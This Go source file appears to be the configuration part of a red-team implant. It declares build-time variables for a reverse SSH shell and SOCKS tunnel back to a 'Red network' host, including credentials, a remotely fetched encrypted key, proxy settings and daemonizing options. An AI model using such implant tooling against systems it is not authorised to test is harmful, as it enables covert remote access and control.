package main

import "sync"

// Global vars
var connections = new(sync.WaitGroup)

// LD_FLAGS' modifiable constants
var (
	SSHServerHost string //SSHServer host
	SSHServerPort string //SSHServer port
	SSHServerUser string //SSHServer user, logging in to SSHServer SSH

	SSHRemoteCmdHost string //SSHRemote host
	SSHRemoteCmdPort string //SSHRemote port
	SSHRemoteCmdUser string //user logging in on reverse SSH shell, addt'l control
	SSHRemoteCmdPwd  string //pw for the ^^ user

	SSHShell           string // Default Shell
	SSHEnvTerm		   string // Terminal for `exec` request type
	SSHRemoteSocksHost string //SOCKS host
	SSHRemoteSocksPort string //SOCKS port

	SSHServerUserKey           string // Encrypted RSA key for SSH tunnel. Embedded unwrap
	SSHServerUserKeyUrl        string // Where encrypted RSA key for SSH tunnel lives. Remote unwrap
	SSHServerUserKeyPassphrase string // decryption key for ^^

	HTTPProxy                string // HTTP Proxy
	HTTPProxyFromEnvironment string // HTTP Proxy set from the Blue environment
	HTTPProxyAuthUser        string // HTTP Proxy User
	HTTPProxyAuthPass        string // HTTP Proxy Pass
	HTTPEndpoint             string // HTTP Endpoint
	WSEndpoint               string // WS/S Endpoint

	LogFile   string // Log file for implant (debugging)
	Daemonize string // Background our of the controlling terminal
	PIDFile   string // PID File for daemon
)

// SSHRemote reverse forwarding port for shell (on Red network)
var SSHRemoteEndpoint = Endpoint{
	Host: SSHRemoteCmdHost,
	Port: SSHRemoteCmdPort,
}

// SSHRemote reverse forwarding port for SOCKS (on Red network)
var SSHRemoteEndpointSOCKS = Endpoint{
	Host: SSHRemoteSocksHost,
	Port: SSHRemoteSocksPort,
}
